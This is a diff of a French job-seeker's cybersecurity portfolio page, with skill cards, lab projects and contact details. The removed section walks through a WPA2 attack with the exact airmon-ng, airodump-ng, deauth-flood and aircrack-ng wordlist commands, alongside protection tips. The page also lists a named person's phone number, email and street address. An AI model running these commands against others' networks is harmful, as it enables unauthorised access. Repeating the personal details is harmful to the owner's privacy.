+            <div class="desc"><strong>Arrivée en France</strong><span>Béziers · début de l'auto-formation cybersécurité</span></div>
+            <span class="tag">Pivot</span>
+          </div>
+          <div class="timeline-row current">
+            <span class="year">2026</span>
+            <div class="desc"><strong>Accompagnement professionnel</strong><span>Mission Locale + France Travail · projets pratiques</span></div>
+            <span class="tag">En cours</span>
+          </div>
+          <div class="timeline-row">
+            <span class="year">↗</span>
+            <div class="desc"><strong>Technicien Cybersécurité Junior · TSSR</strong><span>Stage · alternance · CDI junior</span></div>
+            <span class="tag">Objectif</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SKILLS
+============================================================ -->
+<section class="section" id="skills">
+  <div class="container">
+    <div class="section-tag"><span class="section-num">— 02</span> Stack technique</div>
+
+    <h3 style="font-family:var(--serif); font-size:clamp(40px,6vw,80px); line-height:0.98; letter-spacing:-0.02em; font-weight:400; max-width:18ch; margin-bottom:48px" class="reveal">
+      Quatre <em style="color:var(--acid); font-style:italic">disciplines</em>, un seul objectif&nbsp;: comprendre la machine.
+    </h3>
+
+    <div class="skills-grid reveal reveal-1">
+
+      <div class="skill-card">
+        <span class="num">A</span>
+        <div class="icon">⊹</div>
+        <h4>Cybersécurité<br>offensive</h4>
+        <p class="desc">Tests d'intrusion, méthodologies, OWASP. Compréhension des vecteurs d'attaque modernes.</p>
+        <div class="skill-bar">
+          <span>70</span>
+          <div class="skill-bar-track"><div class="skill-bar-fill" style="--w:70%"></div></div>
+          <span>100</span>
+        </div>
+        <div class="stack">
+          <span>Pentest</span><span>OSINT</span><span>OWASP Top 10</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <span class="num">B</span>
+        <div class="icon">⌘</div>
+        <h4>Kali Linux<br>& Bash</h4>
+        <p class="desc">Environnement de test maîtrisé. Scripts d'automatisation, gestion des paquets, exploitation.</p>
+        <div class="skill-bar">
+          <span>75</span>
+          <div class="skill-bar-track"><div class="skill-bar-fill" style="--w:75%"></div></div>
+          <span>100</span>
+        </div>
+        <div class="stack">
+          <span>Bash</span><span>nmap</span><span>metasploit</span><span>hydra</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <span class="num">C</span>
+        <div class="icon">⌗</div>
+        <h4>Réseaux<br>& protocoles</h4>
+        <p class="desc">TCP/IP, DNS, HTTP/HTTPS, SSH. Capture et analyse de paquets pour comprendre la donnée en transit.</p>
+        <div class="skill-bar">
+          <span>65</span>
+          <div class="skill-bar-track"><div class="skill-bar-fill" style="--w:65%"></div></div>
+          <span>100</span>
+        </div>
+        <div class="stack">
+          <span>Wireshark</span><span>tcpdump</span><span>scapy</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <span class="num">D</span>
+        <div class="icon">≋</div>
+        <h4>Sécurité<br>wireless</h4>
+        <p class="desc">Audit de réseaux WiFi, mode monitor, capture de handshakes WPA2. Protection et durcissement.</p>
+        <div class="skill-bar">
+          <span>60</span>
+          <div class="skill-bar-track"><div class="skill-bar-fill" style="--w:60%"></div></div>
+          <span>100</span>
+        </div>
+        <div class="stack">
+          <span>aircrack-ng</span><span>airmon-ng</span><span>WPA/WPA2</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     PROJECTS
+============================================================ -->
+<section class="section" id="projects">
+  <div class="container">
+    <div class="section-tag"><span class="section-num">— 03</span> Dossiers / cas pratiques</div>
+
+    <h3 style="font-family:var(--serif); font-size:clamp(40px,6vw,80px); line-height:0.98; letter-spacing:-0.02em; font-weight:400; max-width:14ch; margin-bottom:24px" class="reveal">
+      Cinq projets <em style="color:var(--acid); font-style:italic">réels</em> en environnement isolé.
+    </h3>
+    <p style="color:var(--ink-dim); max-width:60ch; margin-bottom:48px; font-size:14px" class="reveal reveal-1">
+      Chaque dossier documente une attaque, sa contre-mesure, et les outils utilisés. Tout est pratiqué en lab privé — usage strictement légal et éducatif.
+    </p>
+
+    <div class="projects-list reveal reveal-2">
+
+      <div class="project-row" data-modal="m-wifi">
+        <span class="project-num">01</span>
+        <div class="project-content">
+          <h4 class="project-title">Sécurité des réseaux sans-fil</h4>
+          <div class="project-meta">
+            <span class="pill">Aircrack-ng</span>
+            <span class="pill">WPA2</span>
+            <span class="pill">3 sem.</span>
+          </div>
+        </div>
+        <span class="project-status">Documenté</span>
+        <span class="project-arrow">⟶</span>
+      </div>
+
+      <div class="project-row" data-modal="m-protocol">
+        <span class="project-num">02</span>
+        <div class="project-content">
+          <h4 class="project-title">Analyse de protocoles</h4>
+          <div class="project-meta">
+            <span class="pill">Wireshark</span>
+            <span class="pill">Scapy</span>
+            <span class="pill">4 sem.</span>
+          </div>
+        </div>
+        <span class="project-status">Documenté</span>
+        <span class="project-arrow">⟶</span>
+      </div>
+
+      <div class="project-row" data-modal="m-lab">
+        <span class="project-num">03</span>
+        <div class="project-content">
+          <h4 class="project-title">Lab de test isolé</h4>
+          <div class="project-meta">
+            <span class="pill">VirtualBox</span>
+            <span class="pill">Metasploit</span>
+            <span class="pill">Continu</span>
+          </div>
+        </div>
+        <span class="project-status">Actif</span>
+        <span class="project-arrow">⟶</span>
+      </div>
+
+      <div class="project-row" data-modal="m-vera">
+        <span class="project-num">04</span>
+        <div class="project-content">
+          <h4 class="project-title">Chiffrement total — VeraCrypt</h4>
+          <div class="project-meta">
+            <span class="pill">AES-256</span>
+            <span class="pill">SHA-512</span>
+            <span class="pill">1 sem.</span>
+          </div>
+        </div>
+        <span class="project-status">Déployé</span>
+        <span class="project-arrow">⟶</span>
+      </div>
+
+      <div class="project-row" data-modal="m-tips">
+        <span class="project-num">05</span>
+        <div class="project-content">
+          <h4 class="project-title">Guide hygiène sécurité — débutants</h4>
+          <div class="project-meta">
+            <span class="pill">Phishing</span>
+            <span class="pill">2FA</span>
+            <span class="pill">WiFi</span>
+          </div>
+        </div>
+        <span class="project-status">Public</span>
+        <span class="project-arrow">⟶</span>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     CONTACT
+============================================================ -->
+<section class="section" id="contact">
+  <div class="container">
+    <div class="section-tag"><span class="section-num">— 04</span> Prise de contact</div>
+
+    <div class="contact-wrap">
+      <div class="reveal">
+        <h3 class="contact-headline">
+          Disponible<br>
+          <em>maintenant.</em>
+          <span class="small">
+            Pour un poste de Technicien Cybersécurité Junior, une formation TSSR, un stage ou une alternance — j'écoute toutes les opportunités sérieuses.
+          </span>
+        </h3>
+      </div>
+
+      <div class="contact-card reveal reveal-1">
+        <div class="label">
+          <span>⊹ Coordonnées</span>
+          <span>2026/Q2</span>
         </div>
 
-        <div class="anime-title">EL HOUSSAYN - PORTFOLIO</div>
+        <a class="contact-row" href="mailto:e.oubenmoussa@gmail.com">
+          <span class="k">Email</span>
+          <span class="v">e.oubenmoussa@gmail.com</span>
+        </a>
+        <a class="contact-row" href="tel:+33659255558">
+          <span class="k">Téléphone</span>
+          <span class="v">+33 6 59 25 55 58</span>
+        </a>
+        <a class="contact-row" href="https://maps.google.com/?q=7+Rue+des+Tanneurs+Béziers" target="_blank" rel="noopener">
+          <span class="k">Adresse</span>
+          <span class="v">7 Rue des Tanneurs, Béziers</span>
+        </a>
 
-        <button class="mode-bas-btn" id="modeBasBtn">Mode Bas</button>
-
-        <div class="battery-circle" id="batteryCircle"></div>
-
-        <div id="room" class="min-h-screen w-full flex flex-col items-center justify-start overflow-hidden relative">
-            <div id="lightEffect" class="room-light"></div>
-
-            <div id="bulbWrapper" class="relative z-10 flex flex-col items-center cursor-pointer group mt-10">
-                <div class="w-1 h-[30vh] bg-gradient-to-b from-gray-900 to-gray-700 swing-animation"></div>
-                
-                <div class="swing-animation -mt-1 flex flex-col items-center">
-                    <div class="w-12 h-8 bg-gradient-to-r from-gray-600 via-gray-300 to-gray-600"></div>
-                    <div class="w-10 h-3 bg-gradient-to-r from-gray-700 via-gray-400 to-gray-700"></div>
-                    <div class="w-6 h-4 bg-black rounded-b-md"></div>
-                    
-                    <div id="bulb" class="w-40 h-40 rounded-full mt-2 bulb-off relative transition-all duration-300">
-                        <div class="absolute top-5 left-8 w-10 h-6 bg-white opacity-30 rounded-full"></div>
-                        <svg class="absolute inset-0 w-full h-full" viewBox="0 0 100 100">
-                            <path d="M 40 0 L 40 40" stroke="#666" stroke-width="0.5" />
-                            <path d="M 60 0 L 60 40" stroke="#666" stroke-width="0.5" />
-                            <path id="coil1" d="M 40 40 Q 50 60 60 40" fill="none" class="filament-off"></path>
-                            <path id="coil2" d="M 40 40 Q 50 55 60 40" fill="none" class="filament-off"></path>
-                        </svg>
-                    </div>
-                </div>
-            </div>
-
-            <div id="loginPages" class="login-pages">
-                <div class="login-page" id="page1">
-                    <h2>🇲🇦 Connexion</h2>
-                    <div class="form-group">
-                        <label>👤 Nom d'utilisateur</label>
-                        <input type="text" placeholder="Entrez votre nom de guerrier..." id="username1" value="Thorfinn">
-                    </div>
-                    <div class="form-group">
-                        <label>🔒 Mot de passe</label>
-                        <input type="password" placeholder="Votre technique secrète..." id="password1" value="password123">
-                    </div>
-                    <button class="login-btn" onclick="loginToPortfolio()">⚔️ SE CONNECTER</button>
-                </div>
-            </div>
-
-            <p id="hint" class="absolute bottom-20 text-white opacity-90 animate-pulse text-lg font-bold z-10">
-                💡 Cliquez sur la Lampe Magique
-            </p>
+        <div class="contact-actions">
+          <a class="btn primary" href="mailto:e.oubenmoussa@gmail.com">⊹ Écrire un email</a>
+          <a class="btn" href="tel:+33659255558">⌘ Appeler</a>
         </div>
+
+        <div class="socials">
+          <a href="https://www.instagram.com/thor_finne/" target="_blank" rel="noopener" aria-label="Instagram">IG</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="footer-grid">
+      <div>© 2026 / Oubenmoussa.E</div>
+      <div class="center"><em>Crafted with discipline ⊹</em></div>
+      <div class="right">v.2026.05 / Béziers</div>
+    </div>
+  </div>
+</footer>
+
+</main>
+
+<!-- ============================================================
+     PROJECT MODALS
+============================================================ -->
+<div class="modal-backdrop" id="modalBackdrop"></div>
+
+<div class="modal" id="m-wifi">
+  <div class="modal-inner">
+    <div class="modal-close">
+      <button data-close>← Fermer</button>
+      <span class="meta">DOSSIER 01 / WIFI-AUDIT</span>
+    </div>
+    <h2>Sécurité des réseaux <em>sans-fil</em></h2>
+    <p class="subtitle">Audit complet WPA2 — capture de handshake, analyse, durcissement.</p>
+
+    <div class="modal-section">
+      <h4>Contexte</h4>
+      <p>Étude approfondie des mécanismes d'authentification WPA/WPA2 sur un point d'accès dédié au lab. L'objectif : comprendre la chaîne d'attaque pour mieux la défendre.</p>
     </div>
 
-    <!-- Portfolio Section -->
-    <div id="portfolioSection" class="portfolio-section">
-        <div class="anime-bg"></div>
-
-        <nav class="navbar fixed top-0 w-full z-50">
-            <div class="container mx-auto px-6 py-4">
-                <div class="flex flex-col md:flex-row justify-between items-center gap-4 md:gap-0">
-                    <div class="text-2xl font-bold glow-text" style="color: var(--accent);">
-                        EL HOUSSAYN OUBENMOUSSA
-                    </div>
-                    <div class="flex flex-wrap justify-center gap-2">
-                        <button class="nav-btn active" onclick="showPage('home')">Accueil</button>
-                        <button class="nav-btn" onclick="showPage('about')">À Propos</button>
-                        <button class="nav-btn" onclick="showPage('skills')">Compétences</button>
-                        <button class="nav-btn" onclick="showPage('projects')">Projets</button>
-                        <button class="nav-btn" onclick="showPage('contact')">Contact</button>
-                    </div>
-                </div>
-            </div>
-        </nav>
-
-        <!-- Page Accueil -->
-        <div id="home" class="portfolio-page active">
-            <section class="hero-section">
-                <div class="container mx-auto px-6">
-                    <div class="hero-content text-center">
-                        <div class="mb-8 flex justify-center">
-                            <img src="image/nn.jpeg" 
-                                 alt="EL HOUSSAYN OUBENMOUSSA" 
-                                 class="profile-image floating">
-                        </div>
-                        <h1 class="hero-title mb-6">
-                            EL HOUSSAYN OUBENMOUSSA
-                        </h1>
-                        <div class="text-2xl mb-8 text-gray-300">
-                            Jeune Passionné de Cybersécurité - 18 Ans
-                        </div>
-                        <p class="text-xl text-gray-300 mb-12 max-w-2xl mx-auto">
-                            En recherche active d'un poste de Technicien Cybersécurité Junior ou d'une formation TSSR<br>
-                            Accompagné par la Mission Locale et inscrit à France Travail
-                        </p>
-                        <div class="flex flex-col md:flex-row justify-center gap-4 md:space-x-6">
-                            <button class="contact-btn" onclick="showPage('projects')">
-                                Voir mes Projets
-                            </button>
-                            <button class="contact-btn bg-transparent border-2 border-red-500" onclick="showPage('contact')">
-                                Me Contacter
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- Page À Propos -->
-        <div id="about" class="portfolio-page">
-            <section class="py-20 bg-black bg-opacity-50">
-                <div class="container mx-auto px-6">
-                    <h2 class="page-title">À PROPOS DE MOI</h2>
-                    <div class="grid md:grid-cols-2 gap-12 items-center">
-                        <div class="animate-fade-in-up">
-                            <h3 class="text-2xl font-bold mb-6 text-red-400">Mon Parcours</h3>
-                            <p class="text-lg text-gray-300 mb-6">
-                                Jeune marocain de 18 ans arrivé en France en 2023, passionné par la cybersécurité et les réseaux depuis mon arrivée.
-                                Auto-formation intensive avec des projets personnels concrets utilisant Kali Linux, Wireshark et des labs virtuels.
-                                Actuellement accompagné par la Mission Locale et inscrit à France Travail.
-                                Objectif professionnel : intégrer un poste de Technicien Cybersécurité Junior ou une formation TSSR.
-                            </p>
-                            
-                            <div class="education-timeline">
-                                <h4 class="text-xl font-bold mb-4 text-yellow-400">Parcours Scolaire et Professionnel</h4>
-                                <div class="timeline-item">
-                                    <div class="font-bold text-white">Parcours Scolaire :</div>
-                                    <div class="text-gray-400">Seconde Bac Pro Menuiserie Bois - 2 mois </div>
-                                </div>S
-                                <div class="timeline-item">
-                                    <div class="font-bold text-white">2023 :</div>
-                                    <div class="text-gray-400">Arrivée en France</div>
-                                </div>
-                                <div class="timeline-item">
-                                    <div class="font-bold text-white">Actuel :</div>
-                                    <div class="text-gray-400">Accompagnement Mission Locale & France Travail - Préparation professionnelle</div>
-                                </div>
-                                <div class="timeline-item">
-                                    <div class="font-bold text-white">2026/2027 (Objectif) :</div>
-                                    <div class="text-gray-400">Poste Technicien Cybersécurité Junior ou formation TSSR</div>
-                                </div>
-                            </div>
-
-                            <div class="development-plan">
-                                <h4 class="text-xl font-bold mb-4 text-green-400">Mon Objectif : Technicien Cybersécurité Junior</h4>
-                                <div class="plan-steps">
-                                    <div class="step">
-                                        <div class="step-number">1</div>
-                                        <div class="step-content">
-                                            <h4 class="font-bold text-white">Développement Technique</h4>
-                                            <p class="text-gray-300">Projets concrets en cybersécurité et réseaux</p>
-                                        </div>
-                                    </div>
-                                    <div class="step">
-                                        <div class="step-number">2</div>
-                                        <div class="step-content">
-                                            <h4 class="font-bold text-white">Recherche Active</h4>
-                                            <p class="text-gray-300">Poste de Technicien Cybersécurité Junior ou formation TSSR</p>
-                                        </div>
-                                    </div>
-                                    <div class="step">
-                                        <div class="step-number">3</div>
-                                        <div class="step-content">
-                                            <h4 class="font-bold text-white">Intégration Professionnelle</h4>
-                                            <p class="text-gray-300">Début de carrière dans la cybersécurité</p>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="animate-fade-in-up">
-                            <div class="skill-card p-8">
-                                <h3 class="text-2xl font-bold mb-6 text-yellow-400">Objectif Professionnel</h3>
-                                <p class="text-gray-300 mb-4">
-                                    <strong>Objectif Principal :</strong><br>
-                                    Poste de Technicien Cybersécurité Junior ou formation TSSR
-                                </p>
-                                <p class="text-gray-300 mb-4">
-                                    <strong>Accompagnement :</strong><br>
-                                    Mission Locale et France Travail
-                                </p>
-                                <p class="text-gray-300">
-                                    <strong>À long terme :</strong><br>
-                                    Devenir expert en cybersécurité (pentester, analyste SOC...)
-                                </p>
-                                
-                                <div class="mt-6 p-4 bg-gradient-to-r from-red-500 to-blue-500 rounded-lg">
-                                    <h4 class="font-bold text-white mb-2">Compétences Linguistiques</h4>
-                                    <p class="text-white">Arabe (Langue maternelle) • Français (Niveau B2) • Compréhension de tous les accents arabes</p>
-                                </div>
-                            </div>
-
-                            <div class="skill-card p-6 mt-6">
-                                <h3 class="text-xl font-bold mb-4 text-green-400">Pourquoi la Cybersécurité ?</h3>
-                                <ul class="text-gray-300 space-y-2">
-                                    <li>✅ Passion pour la sécurité informatique</li>
-                                    <li>✅ Projets pratiques démontrables</li>
-                                    <li>✅ Besoin croissant en experts sécurité</li>
-                                    <li>✅ Formation continue et évolution rapide</li>
-                                </ul>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- Page Compétences -->
-        <div id="skills" class="portfolio-page">
-            <section class="py-20">
-                <div class="container mx-auto px-6">
-                    <h2 class="page-title">MES COMPÉTENCES</h2>
-                    <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-8">
-                        <div class="skill-card p-6 text-center">
-                            <div class="text-4xl mb-4 text-red-400">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Cybersécurité</h3>
-                            <p class="text-gray-300">Bases de la sécurité informatique et tests d'intrusion</p>
-                            <div class="w-full bg-gray-700 rounded-full h-2 mt-4">
-                                <div class="bg-red-500 h-2 rounded-full" style="width: 70%"></div>
-                            </div>
-                        </div>
-
-                        <div class="skill-card p-6 text-center">
-                            <div class="text-4xl mb-4 text-blue-400">
-                                <i class="fas fa-code"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Kali Linux</h3>
-                            <p class="text-gray-300">Environnement de test et outils de sécurité</p>
-                            <div class="w-full bg-gray-700 rounded-full h-2 mt-4">
-                                <div class="bg-blue-500 h-2 rounded-full" style="width: 75%"></div>
-                            </div>
-                        </div>
-
-                        <div class="skill-card p-6 text-center">
-                            <div class="text-4xl mb-4 text-green-400">
-                                <i class="fas fa-network-wired"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Réseaux</h3>
-                            <p class="text-gray-300">Protocoles HTTP/HTTPS, TCP/IP, DNS</p>
-                            <div class="w-full bg-gray-700 rounded-full h-2 mt-4">
-                                <div class="bg-green-500 h-2 rounded-full" style="width: 65%"></div>
-                            </div>
-                        </div>
-
-                        <div class="skill-card p-6 text-center">
-                            <div class="text-4xl mb-4 text-purple-400">
-                                <i class="fas fa-user-secret"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Sécurité Wireless</h3>
-                            <p class="text-gray-300">Analyse et sécurisation des réseaux sans-fil</p>
-                            <div class="w-full bg-gray-700 rounded-full h-2 mt-4">
-                                <div class="bg-purple-500 h-2 rounded-full" style="width: 60%"></div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="mt-12 skill-card p-8">
-                        <h3 class="text-2xl font-bold mb-6 text-yellow-400 text-center">Méthode d'Apprentissage</h3>
-                        <div class="grid md:grid-cols-2 gap-8">
-                            <div>
-                                <h4 class="text-lg font-bold mb-3 text-white">Auto-formation</h4>
-                                <ul class="text-gray-300 space-y-2">
-                                    <li>• YouTube et tutoriels en ligne</li>
-                                    <li>• Documentation technique</li>
-                                    <li>• Pratique en laboratoire virtuel</li>
-                                    <li>• Projets personnels</li>
-                                </ul>
-                            </div>
-                            <div>
-                                <h4 class="text-lg font-bold mb-3 text-white">Recherche Professionnelle</h4>
-                                <ul class="text-gray-300 space-y-2">
-                                    <li>• Développement des compétences techniques</li>
-                                    <li>• Préparation aux entretiens</li>
-                                    <li>• Projets pratiques démontrables</li>
-                                    <li>• Réseautage professionnel</li>
-                                </ul>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- Page Projets -->
-        <div id="projects" class="portfolio-page">
-            <section class="py-20 bg-black bg-opacity-50">
-                <div class="container mx-auto px-6">
-                    <h2 class="page-title">MES PROJETS D'APPRENTISSAGE</h2>
-                    <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-                        
-                        <!-- Sécurité des Réseaux Sans-Fil -->
-                        <div class="project-card p-6">
-                            <div class="text-3xl mb-4 text-red-400">
-                                <i class="fas fa-wifi"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Sécurité des Réseaux Sans-Fil</h3>
-                            <p class="text-gray-300 mb-4">Analyse de la sécurité WiFi et tests de pénétration</p>
-                            <div class="flex flex-wrap gap-2 mb-4">
-                                <span class="bg-red-500 text-white px-2 py-1 rounded text-sm">Kali Linux</span>
-                                <span class="bg-blue-500 text-white px-2 py-1 rounded text-sm">Aircrack-ng</span>
-                                <span class="bg-green-500 text-white px-2 py-1 rounded text-sm">Airodump-ng</span>
-                                <span class="bg-purple-500 text-white px-2 py-1 rounded text-sm">Aireplay-ng</span>
-                            </div>
-                            <button class="contact-btn w-full text-sm" onclick="showProjectDetail('wireless-security')">
-                                Voir le Projet
-                            </button>
-                        </div>
-
-                        <!-- Analyse de Protocoles -->
-                        <div class="project-card p-6">
-                            <div class="text-3xl mb-4 text-yellow-400">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Analyse de Protocoles</h3>
-                            <p class="text-gray-300 mb-4">Étude des protocoles réseau et détection de vulnérabilités</p>
-                            <div class="flex flex-wrap gap-2 mb-4">
-                                <span class="bg-purple-500 text-white px-2 py-1 rounded text-sm">HTTP/HTTPS</span>
-                                <span class="bg-pink-500 text-white px-2 py-1 rounded text-sm">TCP/UDP</span>
-                                <span class="bg-indigo-500 text-white px-2 py-1 rounded text-sm">SSH</span>
-                                <span class="bg-green-500 text-white px-2 py-1 rounded text-sm">DNS</span>
-                            </div>
-                            <button class="contact-btn w-full text-sm" onclick="showProjectDetail('protocol-analysis')">
-                                Voir le Projet
-                            </button>
-                        </div>
-
-                        <!-- Environnement de Test Sécurisé -->
-                        <div class="project-card p-6">
-                            <div class="text-3xl mb-4 text-blue-400">
-                                <i class="fas fa-lock"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Environnement de Test Sécurisé</h3>
-                            <p class="text-gray-300 mb-4">Configuration de lab virtuel pour tests de sécurité</p>
-                            <div class="flex flex-wrap gap-2 mb-4">
-                                <span class="bg-green-500 text-white px-2 py-1 rounded text-sm">VirtualBox</span>
-                                <span class="bg-yellow-500 text-white px-2 py-1 rounded text-sm">Kali Linux</span>
-                                <span class="bg-purple-500 text-white px-2 py-1 rounded text-sm">Hydra</span>
-                                <span class="bg-red-500 text-white px-2 py-1 rounded text-sm">Metasploit</span>
-                                <span class="bg-indigo-500 text-white px-2 py-1 rounded text-sm">Nmap</span>
-                            </div>
-                            <button class="contact-btn w-full text-sm" onclick="showProjectDetail('test-environment')">
-                                Voir le Projet
-                            </button>
-                        </div>
-
-                        <!-- Chiffrement PC avec VeraCrypt -->
-                        <div class="project-card p-6">
-                            <div class="text-3xl mb-4 text-green-400">
-                                <i class="fas fa-lock"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Chiffrement PC avec VeraCrypt</h3>
-                            <p class="text-gray-300 mb-4">Chiffrement complet du PC pour protéger les données sensibles</p>
-                            <div class="flex flex-wrap gap-2 mb-4">
-                                <span class="bg-green-500 text-white px-2 py-1 rounded text-sm">VeraCrypt</span>
-                                <span class="bg-blue-500 text-white px-2 py-1 rounded text-sm">Chiffrement</span>
-                                <span class="bg-purple-500 text-white px-2 py-1 rounded text-sm">Sécurité Données</span>
-                                <span class="bg-red-500 text-white px-2 py-1 rounded text-sm">AES-256</span>
-                            </div>
-                            <button class="contact-btn w-full text-sm" onclick="showProjectDetail('veracrypt')">
-                                Voir le Projet
-                            </button>
-                        </div>
-
-                        <!-- Conseils Sécurité Débutants -->
-                        <div class="project-card p-6">
-                            <div class="text-3xl mb-4 text-green-400">
-                                <i class="fas fa-user-shield"></i>
-                            </div>
-                            <h3 class="text-xl font-bold mb-3">Conseils Sécurité Débutants</h3>
-                            <p class="text-gray-300 mb-4">Guide pratique pour se protéger des attaques courantes (WiFi, phishing...)</p>
-                            <div class="flex flex-wrap gap-2 mb-4">
-                                <span class="bg-green-500 text-white px-2 py-1 rounded text-sm">Prévention</span>
-                                <span class="bg-yellow-500 text-white px-2 py-1 rounded text-sm">WiFi</span>
-                                <span class="bg-red-500 text-white px-2 py-1 rounded text-sm">Phishing</span>
-                                <span class="bg-purple-500 text-white px-2 py-1 rounded text-sm">Social Engineering</span>
-                            </div>
-                            <button class="contact-btn w-full text-sm" onclick="showProjectDetail('security-tips')">
-                                Voir les Conseils
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- صفحة تفصيلية لمشروع أمن الشبكات اللاسلكية -->
-        <div id="wireless-security" class="project-detail-page">
-            <div class="project-header">
-                <div class="container mx-auto px-6">
-                    <button class="back-btn" onclick="showPage('projects')">
-                        <i class="fas fa-arrow-left mr-2"></i>Retour aux Projets
-                    </button>
-                    <h1 class="text-4xl md:text-5xl font-bold mb-4">Sécurité des Réseaux Sans-Fil</h1>
-                    <p class="text-xl text-gray-300">Analyse approfondie de la sécurité WiFi et tests de pénétration</p>
-                </div>
-            </div>
-
-            <div class="project-detail-content">
-                <div class="grid md:grid-cols-3 gap-8 mb-8">
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-red-400">
-                            <i class="fas fa-info-circle mr-2"></i>Description
-                        </h3>
-                        <p class="text-gray-300">
-                            Projet d'analyse de sécurité des réseaux WiFi utilisant Kali Linux et ses outils 
-                            pour identifier les vulnérabilités et tester la résistance des réseaux sans-fil.
-                        </p>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                            <i class="fas fa-cogs mr-2"></i>Technologies
-                        </h3>
-                        <div class="tech-stack">
-                            <span class="tech-badge">Kali Linux</span>
-                            <span class="tech-badge">Aircrack-ng</span>
-                            <span class="tech-badge">Airodump-ng</span>
-                            <span class="tech-badge">Aireplay-ng</span>
-                            <span class="tech-badge">Wireshark</span>
-                        </div>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-green-400">
-                            <i class="fas fa-calendar mr-2"></i>Durée
-                        </h3>
-                        <p class="text-gray-300 text-xl">3 semaines</p>
-                        <p class="text-gray-400">Recherche et tests pratiques</p>
-                    </div>
-                </div>
-
-                <div class="project-section">
-                    <h3 class="text-2xl font-bold mb-4 text-yellow-400">
-                        <i class="fas fa-wifi mr-2"></i>Outils WiFi Principaux
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Aircrack-ng Suite</h4>
-                            <ul class="text-gray-300">
-                                <li>• <strong>airodump-ng</strong> : Capture packets WiFi</li>
-                                <li>• <strong>aireplay-ng</strong> : Injection packets (deauth attacks)</li>
-                                <li>• <strong>aircrack-ng</strong> : Crack passwords WEP/WPA</li>
-                                <li>• <strong>airmon-ng</strong> : Mode monitor pour cartes WiFi</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Processus d'Attaque WiFi</h4>
-                            <ul class="text-gray-300">
-                                <li>1. Activer le mode monitor : <code>airmon-ng start wlan0</code></li>
-                                <li>2. Scanner réseaux : <code>airodump-ng wlan0mon</code></li>
-                                <li>3. Capturer handshake : <code>airodump-ng -c canal --bssid MAC</code></li>
-                                <li>4. Désauthentifier client : <code>aireplay-ng --deauth</code></li>
-                                <li>5. Cracker mot de passe : <code>aircrack-ng capture.cap</code></li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="demo-section">
-                    <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                        <i class="fas fa-code mr-2"></i>Exemple de Commande Complète
-                    </h3>
-                    <div class="code-snippet">
-                        # Étape 1 : Voir les interfaces réseau<br>
-                        iwconfig<br><br>
-                        
-                        # Étape 2 : Activer le mode monitor<br>
-                        sudo airmon-ng start wlan0<br>
-                        sudo airmon-ng check kill<br><br>
-                        
-                        # Étape 3 : Scanner les réseaux WiFi<br>
-                        sudo airodump-ng wlan0mon<br><br>
-                        
-                        # Étape 4 : Capturer le handshake WPA<br>
-                        sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon<br><br>
-                        
-                        # Étape 5 : Désauthentifier un client<br>
-                        sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon<br><br>
-                        
-                        # Étape 6 : Cracker le mot de passe<br>
-                        sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture*.cap
-                    </div>
-                </div>
-
-                <div class="project-section mt-6">
-                    <h3 class="text-2xl font-bold mb-4 text-purple-400">
-                        <i class="fas fa-shield-alt mr-2"></i>Comment Se Protéger ?
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">🛡️ Protection WiFi</h4>
-                            <ul class="text-gray-300 space-y-2">
-                                <li>• Utiliser WPA3 ou WPA2 AES (jamais WEP!)</li>
-                                <li>• Mot de passe long (>14 caractères)</li>
-                                <li>• Combinaison lettres/chiffres/symboles</li>
-                                <li>• Désactiver WPS (vulnérable)</li>
-                                <li>• Changer mot de passe admin routeur</li>
-                                <li>• MAC filtering (optionnel)</li>
-                                <li>• SSID caché (protection limitée)</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">🔍 Détection d'Attaques</h4>
-                            <ul class="text-gray-300 space-y-2">
-                                <li>• Déconnexions WiFi fréquentes</li>
-                                <li>• Ralentissement du réseau</li>
-                                <li>• Clients inconnus dans logs routeur</li>
-                                <li>• Outils comme Wireshark pour analyser</li>
